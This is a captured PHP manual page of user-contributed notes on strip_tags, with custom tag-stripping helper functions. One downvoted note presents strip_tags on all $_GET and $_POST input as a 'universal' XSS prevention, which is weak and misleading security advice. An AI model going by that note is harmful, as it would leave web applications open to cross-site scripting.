+<span class="default">&lt;?php<br />&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">/**<br />&nbsp; &nbsp; * Works like PHP function strip_tags, but it only removes selected tags.<br />&nbsp; &nbsp; * Example:<br />&nbsp; &nbsp; *&nbsp; &nbsp;&nbsp; strip_selected_tags('&lt;b&gt;Person:&lt;/b&gt; &lt;strong&gt;Salavert&lt;/strong&gt;', 'strong') =&gt; &lt;b&gt;Person:&lt;/b&gt; Salavert<br />&nbsp; &nbsp; */<br /><br />&nbsp; &nbsp; </span><span class="keyword">function </span><span class="default">strip_selected_tags</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="default">$tags </span><span class="keyword">= array())<br />&nbsp; &nbsp; {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$args </span><span class="keyword">= </span><span class="default">func_get_args</span><span class="keyword">();<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">array_shift</span><span class="keyword">(</span><span class="default">$args</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$tags </span><span class="keyword">= </span><span class="default">func_num_args</span><span class="keyword">() &gt; </span><span class="default">2 </span><span class="keyword">? </span><span class="default">array_diff</span><span class="keyword">(</span><span class="default">$args</span><span class="keyword">,array(</span><span class="default">$text</span><span class="keyword">))&nbsp; : (array)</span><span class="default">$tags</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; foreach (</span><span class="default">$tags </span><span class="keyword">as </span><span class="default">$tag</span><span class="keyword">){<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(</span><span class="default">preg_match_all</span><span class="keyword">(</span><span class="string">'/&lt;'</span><span class="keyword">.</span><span class="default">$tag</span><span class="keyword">.</span><span class="string">'[^&gt;]*&gt;(.*)&lt;\/'</span><span class="keyword">.</span><span class="default">$tag</span><span class="keyword">.</span><span class="string">'&gt;/iU'</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">, </span><span class="default">$found</span><span class="keyword">)){<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="default">$found</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">],</span><span class="default">$found</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">],</span><span class="default">$text</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; &nbsp; }<br /><br />&nbsp; &nbsp; &nbsp; &nbsp; return </span><span class="default">$text</span><span class="keyword">;<br />&nbsp; &nbsp; }<br /><br /></span><span class="default">?&gt;<br /></span><br />Hope you find it useful,<br /><br />Jose Salavert</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="114566"> <div class="votes">
+<div id="Vu114566">
+<a href="http://php.net/manual/vote-note.php?id=114566&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd114566">
+<a href="http://php.net/manual/vote-note.php?id=114566&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V114566" title="32% like this...">
+    -11
+    </div>
+</div>
+<a href="#114566" class="name">
+<strong class="user"><em>andy</em></strong></a><a class="genanchor" href="#114566"> &para;</a><div class="date" title="2014-03-06 03:33"><strong>1 year ago</strong></div>
+<div class="text" id="Hcom114566">
+<div class="phpcode"><code><span class="html">
+<span class="default">&lt;?php<br /></span><span class="comment">//***&nbsp; &nbsp; Universal prevent xss&nbsp; ***<br />//&nbsp;&nbsp; place this in top of script to prevent xss on your site<br /></span><span class="default">$_GET</span><span class="keyword">=</span><span class="default">array_map</span><span class="keyword">(</span><span class="string">"strip_tags"</span><span class="keyword">,</span><span class="default">$_GET</span><span class="keyword">);<br /></span><span class="default">$_POST</span><span class="keyword">=</span><span class="default">array_map</span><span class="keyword">(</span><span class="string">"strip_tags"</span><span class="keyword">,</span><span class="default">$_POST</span><span class="keyword">);<br /></span><span class="default">?&gt;</span>
+</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="89410"> <div class="votes">
+<div id="Vu89410">
+<a href="http://php.net/manual/vote-note.php?id=89410&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd89410">
+<a href="http://php.net/manual/vote-note.php?id=89410&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V89410" title="31% like this...">
+    -7
+    </div>
+</div>
+<a href="#89410" class="name">
+<strong class="user"><em>kai at froghh dot de</em></strong></a><a class="genanchor" href="#89410"> &para;</a><div class="date" title="2009-03-06 08:45"><strong>6 years ago</strong></div>
+<div class="text" id="Hcom89410">
+<div class="phpcode"><code><span class="html">
+a function that decides if &lt; is a start of a tag or a lower than / lower than + equal:<br /> <br /><span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">lt_replace</span><span class="keyword">(</span><span class="default">$str</span><span class="keyword">){<br />&nbsp; &nbsp; return </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">"/&lt;([^[:alpha:]])/"</span><span class="keyword">, </span><span class="string">'&amp;lt;\\1'</span><span class="keyword">, </span><span class="default">$str</span><span class="keyword">);<br />}<br /></span><span class="default">?&gt;<br /></span> <br />It's to be used before strip_slashes.</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="116108"> <div class="votes">
+<div id="Vu116108">
+<a href="http://php.net/manual/vote-note.php?id=116108&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd116108">
+<a href="http://php.net/manual/vote-note.php?id=116108&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V116108" title="22% like this...">
+    -5
+    </div>
+</div>
+<a href="#116108" class="name">
+<strong class="user"><em>fernando at zauber dot es</em></strong></a><a class="genanchor" href="#116108"> &para;</a><div class="date" title="2014-11-10 11:45"><strong>1 year ago</strong></div>
+<div class="text" id="Hcom116108">
+<div class="phpcode"><code><span class="html">
+As you probably know, the native function strip_tags don't work very well with malformed HTML when you use the allowed tags parameter.<br />This is a very simple but effective function to remove html tags. It takes a list (array) of allowed tags as second parameter:<br /><br /><span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">flame_strip_tags</span><span class="keyword">(</span><span class="default">$html</span><span class="keyword">, </span><span class="default">$allowed_tags</span><span class="keyword">=array()) {<br />&nbsp; </span><span class="default">$allowed_tags</span><span class="keyword">=</span><span class="default">array_map</span><span class="keyword">(</span><span class="default">strtolower</span><span class="keyword">,</span><span class="default">$allowed_tags</span><span class="keyword">);<br />&nbsp; </span><span class="default">$rhtml</span><span class="keyword">=</span><span class="default">preg_replace_callback</span><span class="keyword">(</span><span class="string">'/&lt;\/?([^&gt;\s]+)[^&gt;]*&gt;/i'</span><span class="keyword">, function (</span><span class="default">$matches</span><span class="keyword">) use (&amp;</span><span class="default">$allowed_tags</span><span class="keyword">) {&nbsp; &nbsp; &nbsp; &nbsp; <br />&nbsp; &nbsp; return </span><span class="default">in_array</span><span class="keyword">(</span><span class="default">strtolower</span><span class="keyword">(</span><span class="default">$matches</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]),</span><span class="default">$allowed_tags</span><span class="keyword">)?</span><span class="default">$matches</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]:</span><span class="string">''</span><span class="keyword">;<br />&nbsp; },</span><span class="default">$html</span><span class="keyword">);<br />&nbsp; return </span><span class="default">$rhtml</span><span class="keyword">;<br />}<br /></span><span class="default">?&gt;<br /></span><br />The function works reasonably well with invalid/bad formatted HTML.<br /><br />Use:<br /><br /><span class="default">&lt;?php<br />$allowed_tags</span><span class="keyword">=array(</span><span class="string">"h1"</span><span class="keyword">,</span><span class="string">"a"</span><span class="keyword">);<br /></span><span class="default">$html</span><span class="keyword">=&lt;&lt;&lt;EOD<br /></span><span class="string">&lt;h1&gt;Example&lt;/h1&gt;<br />&lt;dt&gt;&lt;a href='/manual/en/getting-started.php'&gt;Getting Started&lt;/a&gt;&lt;/dt&gt;<br />&nbsp; &nbsp; &lt;dd&gt;&lt;a href='/manual/en/introduction.php'&gt;Introduction&lt;/a&gt;&lt;/dd&gt;<br />&nbsp; &nbsp; &lt;dd&gt;&lt;a href='/manual/en/tutorial.php'&gt;A simple tutorial&lt;/a&gt;&lt;/dd&gt;<br />&lt;dt&gt;&lt;a href='/manual/en/langref.php'&gt;Language Reference&lt;/a&gt;&lt;/dt&gt;<br />&nbsp; &nbsp; &lt;dd&gt;&lt;a href='/manual/en/language.basic-syntax.php'&gt;Basic syntax&lt;/a&gt;&lt;/dd&gt;<br />&nbsp; &nbsp; &lt;dd&gt;&lt;a href='/manual/en/reserved.interfaces.php'&gt;Predefined Interfaces and Classes&lt;/a&gt;&lt;/dd&gt;<br />&lt;/dl&gt;<br /></span><span class="keyword">EOD;<br />echo </span><span class="default">flame_strip_tags</span><span class="keyword">(</span><span class="default">$html</span><span class="keyword">,</span><span class="default">$allowed_tags</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span><br />The output will be:<br /><br />&lt;h1&gt;Example&lt;/h1&gt;<br />&lt;a href='/manual/en/getting-started.php'&gt;Getting Started&lt;/a&gt;<br />&lt;a href='/manual/en/introduction.php'&gt;Introduction&lt;/a&gt;<br />&lt;a href='/manual/en/tutorial.php'&gt;A simple tutorial&lt;/a&gt;<br />&lt;a href='/manual/en/langref.php'&gt;Language Reference&lt;/a&gt;<br />&lt;a href='/manual/en/language.basic-syntax.php'&gt;Basic syntax&lt;/a&gt;<br />&lt;a href='/manual/en/reserved.interfaces.php'&gt;Predefined Interfaces and Classes&lt;/a&gt;</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="90080"> <div class="votes">
+<div id="Vu90080">
+<a href="http://php.net/manual/vote-note.php?id=90080&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd90080">
+<a href="http://php.net/manual/vote-note.php?id=90080&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V90080" title="25% like this...">
+    -26
+    </div>
+</div>
+<a href="#90080" class="name">
+<strong class="user"><em>brettz9 AAT yah</em></strong></a><a class="genanchor" href="#90080"> &para;</a><div class="date" title="2009-04-05 08:10"><strong>6 years ago</strong></div>
+<div class="text" id="Hcom90080">
+<div class="phpcode"><code><span class="html">
+Works on shortened &lt;?...?&gt; syntax and thus also will remove XML processing instructions.</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="68757"> <div class="votes">
+<div id="Vu68757">
+<a href="http://php.net/manual/vote-note.php?id=68757&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd68757">
+<a href="http://php.net/manual/vote-note.php?id=68757&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V68757" title="29% like this...">
+    -95
+    </div>
+</div>
+<a href="#68757" class="name">
+<strong class="user"><em>admin at automapit dot com</em></strong></a><a class="genanchor" href="#68757"> &para;</a><div class="date" title="2006-08-09 10:01"><strong>9 years ago</strong></div>
+<div class="text" id="Hcom68757">
+<div class="phpcode"><code><span class="html">
+<span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">html2txt</span><span class="keyword">(</span><span class="default">$document</span><span class="keyword">){<br /></span><span class="default">$search </span><span class="keyword">= array(</span><span class="string">'@&lt;script[^&gt;]*?&gt;.*?&lt;/script&gt;@si'</span><span class="keyword">,&nbsp; </span><span class="comment">// Strip out javascript<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="string">'@&lt;[\/\!]*?[^&lt;&gt;]*?&gt;@si'</span><span class="keyword">,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">// Strip out HTML tags<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="string">'@&lt;style[^&gt;]*?&gt;.*?&lt;/style&gt;@siU'</span><span class="keyword">,&nbsp; &nbsp; </span><span class="comment">// Strip style tags properly<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="string">'@&lt;![\s\S]*?--[ \t\n\r]*&gt;@'&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Strip multi-line comments including CDATA<br /></span><span class="keyword">);<br /></span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="default">$search</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$document</span><span class="keyword">);<br />return </span><span class="default">$text</span><span class="keyword">;<br />}<br /></span><span class="default">?&gt;<br /></span> <br />This function turns HTML into text... strips tags, comments spanning multiple lines including CDATA, and anything else that gets in it's way.<br /> <br />It's a frankenstein function I made from bits picked up on my travels through the web, thanks to the many who have unwittingly contributed!</span>
+</code></div>
+</div>
+</div></div>
+<div class="foot"><a href="http://php.net/manual/add-note.php?sect=function.strip-tags&amp;redirect=http://php.net/manual/en/function.strip-tags.php"><img src="/images/notes-add@2x.png" alt="add a note" width="12" height="12" /> <small>add a note</small></a></div>
+</section> <!-- layout-content -->
+<aside class="layout-menu">
+<ul class="parent-menu-list">
+<li>
+<a href="ref.strings.php">String Functions</a>
+<ul class="child-menu-list">
+<li class="">
+<a href="function.addcslashes.php" title="addcslashes">addcslashes</a>
+</li>
+<li class="">
+<a href="function.addslashes.php" title="addslashes">addslashes</a>
+</li>
+<li class="">
+<a href="function.bin2hex.php" title="bin2hex">bin2hex</a>
+</li>
+<li class="">
+<a href="function.chop.php" title="chop">chop</a>
+</li>
+<li class="">
+<a href="function.chr.php" title="chr">chr</a>
+</li>
+<li class="">
+<a href="function.chunk-split.php" title="chunk_​split">chunk_&#8203;split</a>
+</li>
+<li class="">
+<a href="function.convert-cyr-string.php" title="convert_​cyr_​string">convert_&#8203;cyr_&#8203;string</a>
+</li>
+<li class="">
+<a href="function.convert-uudecode.php" title="convert_​uudecode">convert_&#8203;uudecode</a>
+</li>
+<li class="">
+<a href="function.convert-uuencode.php" title="convert_​uuencode">convert_&#8203;uuencode</a>
+</li>
+<li class="">
+<a href="function.count-chars.php" title="count_​chars">count_&#8203;chars</a>
+</li>
+<li class="">
+<a href="function.crc32.php" title="crc32">crc32</a>
+</li>
+<li class="">
+<a href="function.crypt.php" title="crypt">crypt</a>
+</li>
+<li class="">
+<a href="function.echo.php" title="echo">echo</a>
+</li>
+<li class="">
+<a href="function.explode.php" title="explode">explode</a>
+</li>
+<li class="">
+<a href="function.fprintf.php" title="fprintf">fprintf</a>
+</li>
+<li class="">
+<a href="function.get-html-translation-table.php" title="get_​html_​translation_​table">get_&#8203;html_&#8203;translation_&#8203;table</a>
+</li>
+<li class="">
+<a href="function.hebrev.php" title="hebrev">hebrev</a>
+</li>
+<li class="">
+<a href="function.hebrevc.php" title="hebrevc">hebrevc</a>
+</li>
+<li class="">
+<a href="function.hex2bin.php" title="hex2bin">hex2bin</a>
+</li>
+<li class="">
+<a href="function.html-entity-decode.php" title="html_​entity_​decode">html_&#8203;entity_&#8203;decode</a>
+</li>
+<li class="">
+<a href="function.htmlentities.php" title="htmlentities">htmlentities</a>
+</li>
+<li class="">
+<a href="function.htmlspecialchars-decode.php" title="htmlspecialchars_​decode">htmlspecialchars_&#8203;decode</a>
+</li>
+<li class="">
+<a href="function.htmlspecialchars.php" title="htmlspecialchars">htmlspecialchars</a>
+</li>
+<li class="">
+<a href="function.implode.php" title="implode">implode</a>
+</li>
+<li class="">
+<a href="function.join.php" title="join">join</a>
+</li>
+<li class="">
+<a href="function.lcfirst.php" title="lcfirst">lcfirst</a>
+</li>
+<li class="">
+<a href="function.levenshtein.php" title="levenshtein">levenshtein</a>
+</li>
+<li class="">
+<a href="function.localeconv.php" title="localeconv">localeconv</a>
+</li>
+<li class="">
+<a href="function.ltrim.php" title="ltrim">ltrim</a>
+</li>
+<li class="">
+<a href="function.md5-file.php" title="md5_​file">md5_&#8203;file</a>
+</li>
+<li class="">
+<a href="function.md5.php" title="md5">md5</a>
+</li>
+<li class="">
+<a href="function.metaphone.php" title="metaphone">metaphone</a>
+</li>
+<li class="">
+<a href="function.money-format.php" title="money_​format">money_&#8203;format</a>
+</li>
+<li class="">
+<a href="function.nl-langinfo.php" title="nl_​langinfo">nl_&#8203;langinfo</a>
+</li>
+<li class="">
+<a href="function.nl2br.php" title="nl2br">nl2br</a>
+</li>
+<li class="">
+<a href="function.number-format.php" title="number_​format">number_&#8203;format</a>
+</li>
+<li class="">
+<a href="function.ord.php" title="ord">ord</a>
+</li>
+<li class="">
+<a href="function.parse-str.php" title="parse_​str">parse_&#8203;str</a>
+</li>
+<li class="">
+<a href="function.print.php" title="print">print</a>
+</li>
+<li class="">
+<a href="function.printf.php" title="printf">printf</a>
+</li>
+<li class="">
+<a href="function.quoted-printable-decode.php" title="quoted_​printable_​decode">quoted_&#8203;printable_&#8203;decode</a>
+</li>
+<li class="">
+<a href="function.quoted-printable-encode.php" title="quoted_​printable_​encode">quoted_&#8203;printable_&#8203;encode</a>
+</li>
+<li class="">
+<a href="function.quotemeta.php" title="quotemeta">quotemeta</a>
+</li>
+<li class="">
+<a href="function.rtrim.php" title="rtrim">rtrim</a>
+</li>
+<li class="">
+<a href="function.setlocale.php" title="setlocale">setlocale</a>
+</li>
+<li class="">
+<a href="function.sha1-file.php" title="sha1_​file">sha1_&#8203;file</a>
+</li>
+<li class="">
+<a href="function.sha1.php" title="sha1">sha1</a>
+</li>
+<li class="">
+<a href="function.similar-text.php" title="similar_​text">similar_&#8203;text</a>
+</li>
+<li class="">
+<a href="function.soundex.php" title="soundex">soundex</a>
+</li>
+<li class="">
+<a href="function.sprintf.php" title="sprintf">sprintf</a>
+</li>
+<li class="">
+<a href="function.sscanf.php" title="sscanf">sscanf</a>
+</li>
+<li class="">
+<a href="function.str-getcsv.php" title="str_​getcsv">str_&#8203;getcsv</a>
+</li>
+<li class="">
+<a href="function.str-ireplace.php" title="str_​ireplace">str_&#8203;ireplace</a>
+</li>
+<li class="">
+<a href="function.str-pad.php" title="str_​pad">str_&#8203;pad</a>
+</li>
+<li class="">
+<a href="function.str-repeat.php" title="str_​repeat">str_&#8203;repeat</a>
+</li>
+<li class="">
+<a href="function.str-replace.php" title="str_​replace">str_&#8203;replace</a>
+</li>
+<li class="">
+<a href="function.str-rot13.php" title="str_​rot13">str_&#8203;rot13</a>
+</li>
+<li class="">
+<a href="function.str-shuffle.php" title="str_​shuffle">str_&#8203;shuffle</a>
+</li>
+<li class="">
+<a href="function.str-split.php" title="str_​split">str_&#8203;split</a>
+</li>
+<li class="">
+<a href="function.str-word-count.php" title="str_​word_​count">str_&#8203;word_&#8203;count</a>
+</li>
+<li class="">
+<a href="function.strcasecmp.php" title="strcasecmp">strcasecmp</a>
+</li>
+<li class="">
+<a href="function.strchr.php" title="strchr">strchr</a>
+</li>
+<li class="">
+<a href="function.strcmp.php" title="strcmp">strcmp</a>
+</li>
+<li class="">
+<a href="function.strcoll.php" title="strcoll">strcoll</a>
+</li>
+<li class="">
+<a href="function.strcspn.php" title="strcspn">strcspn</a>
+</li>
+<li class="current">
+<a href="function.strip-tags.php" title="strip_​tags">strip_&#8203;tags</a>
+</li>
+<li class="">
+<a href="function.stripcslashes.php" title="stripcslashes">stripcslashes</a>
+</li>
+<li class="">
+<a href="function.stripos.php" title="stripos">stripos</a>
+</li>
+<li class="">
+<a href="function.stripslashes.php" title="stripslashes">stripslashes</a>
+</li>
+<li class="">
+<a href="function.stristr.php" title="stristr">stristr</a>
+</li>
+<li class="">
+<a href="function.strlen.php" title="strlen">strlen</a>
+</li>
+<li class="">
+<a href="function.strnatcasecmp.php" title="strnatcasecmp">strnatcasecmp</a>
+</li>
+<li class="">
+<a href="function.strnatcmp.php" title="strnatcmp">strnatcmp</a>
+</li>
+<li class="">
+<a href="function.strncasecmp.php" title="strncasecmp">strncasecmp</a>
+</li>
+<li class="">
+<a href="function.strncmp.php" title="strncmp">strncmp</a>
+</li>
+<li class="">
+<a href="function.strpbrk.php" title="strpbrk">strpbrk</a>
+</li>
+<li class="">
+<a href="function.strpos.php" title="strpos">strpos</a>
+</li>
+<li class="">
+<a href="function.strrchr.php" title="strrchr">strrchr</a>
+</li>
+<li class="">
+<a href="function.strrev.php" title="strrev">strrev</a>
+</li>
+<li class="">
+<a href="function.strripos.php" title="strripos">strripos</a>
+</li>
+<li class="">
+<a href="function.strrpos.php" title="strrpos">strrpos</a>
+</li>
+<li class="">
+<a href="function.strspn.php" title="strspn">strspn</a>
+</li>
+<li class="">
+<a href="function.strstr.php" title="strstr">strstr</a>
+</li>
+<li class="">
+<a href="function.strtok.php" title="strtok">strtok</a>
+</li>
+<li class="">
+<a href="function.strtolower.php" title="strtolower">strtolower</a>
+</li>
+<li class="">
+<a href="function.strtoupper.php" title="strtoupper">strtoupper</a>
+</li>
+<li class="">
+<a href="function.strtr.php" title="strtr">strtr</a>
+</li>
+<li class="">
+<a href="function.substr-compare.php" title="substr_​compare">substr_&#8203;compare</a>
+</li>
+<li class="">
+<a href="function.substr-count.php" title="substr_​count">substr_&#8203;count</a>
+</li>
+<li class="">
+<a href="function.substr-replace.php" title="substr_​replace">substr_&#8203;replace</a>
+</li>
+<li class="">
+<a href="function.substr.php" title="substr">substr</a>
+</li>
+<li class="">
+<a href="function.trim.php" title="trim">trim</a>
+</li>
+<li class="">
+<a href="function.ucfirst.php" title="ucfirst">ucfirst</a>
+</li>
+<li class="">
+<a href="function.ucwords.php" title="ucwords">ucwords</a>
+</li>
+<li class="">
+<a href="function.vfprintf.php" title="vfprintf">vfprintf</a>
+</li>
+<li class="">
+<a href="function.vprintf.php" title="vprintf">vprintf</a>
+</li>
+<li class="">
+<a href="function.vsprintf.php" title="vsprintf">vsprintf</a>
+</li>
+<li class="">
+<a href="function.wordwrap.php" title="wordwrap">wordwrap</a>
+</li>
+</ul>
+</li>
+</ul>
+</aside>
+</div><!-- layout -->
+<footer>
+<div class="container footer-content">
+<div class="row-fluid">
+<ul class="footmenu">
+<li><a href="http://php.net/copyright.php">Copyright &copy; 2001-2016 The PHP Group</a></li>
+<li><a href="http://php.net/my.php">My PHP.net</a></li>
+<li><a href="http://php.net/contact.php">Contact</a></li>
+<li><a href="http://php.net/sites.php">Other PHP.net sites</a></li>
+<li><a href="http://php.net/mirrors.php">Mirror sites</a></li>
+<li><a href="http://php.net/privacy.php">Privacy policy</a></li>
+</ul>
+</div>
+</div>
+</footer>
+<!-- External and third party libraries. -->
+<script type="text/javascript" src="http://php.net//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script type="text/javascript" src="http://php.net/cached.php?t=1421837618&amp;f=/js/ext/modernizr.js"></script>
+<script type="text/javascript" src="http://php.net/cached.php?t=1421837618&amp;f=/js/ext/hogan-2.0.0.min.js"></script>
+<script type="text/javascript" src="http://php.net/cached.php?t=1421837618&amp;f=/js/ext/typeahead.min.js"></script>
+<script type="text/javascript" src="http://php.net/cached.php?t=1421837618&amp;f=/js/ext/mousetrap.min.js"></script>
+<script type="text/javascript" src="http://php.net/cached.php?t=1421837618&amp;f=/js/search.js"></script>
+<script type="text/javascript" src="http://php.net/cached.php?t=1435099203&amp;f=/js/common.js"></script>
+<a id="toTop" href="javascript:;"><span id="toTopHover"></span><img width="40" height="40" alt="To Top" src="/images/to-top@2x.png" /></a>
+</body>
+</html>
